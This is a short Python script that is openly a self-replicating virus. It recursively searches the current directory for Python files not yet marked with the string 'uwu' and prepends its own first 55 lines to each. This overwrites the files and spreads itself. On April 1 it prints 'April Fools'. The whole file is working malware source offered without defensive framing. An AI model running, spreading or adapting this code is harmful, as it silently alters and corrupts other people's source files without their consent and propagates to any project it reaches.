import os, datetime, inspect

NAME = "uwu"

def search(path):
	files_to_infect = []
	filelist = os.listdir(path)
	# print(filelist)
	for file in filelist:
		print(file[-3:])
		if os.path.isdir(path+"/"+file): # if its a folder
			files_to_infect.extend(search(path+"/"+file))
		elif file[-3:] == ".py":
			infected = False
			for line in open(path+"/"+file):
				if NAME in line:
					infected = True
					break
			if infected == False:
				files_to_infect.append(path+"/"+file)
	return files_to_infect

def infect(files_to_infect):
	target_file = inspect.currentframe().f_code.co_filename
	# print(target_file)
	virus = open(os.path.abspath(target_file))
	v_string = ""
	for i, line in enumerate(virus):
		if i >= 0 and i < 55:
			v_string += line
	virus.close()

	for fname in files_to_infect:
		f = open(fname)
		temp = f.read()
		f.close()
		f = open(fname, "w")
		f.write(v_string + temp)
		f.close()

def april_fools():
	if datetime.datetime.now().month == 4 and datetime.datetime.now().day == 1:
		print("April Fools")


files_to_infect = search(os.path.abspath(""))
# print(files_to_infect)
infect(files_to_infect)
april_fools()
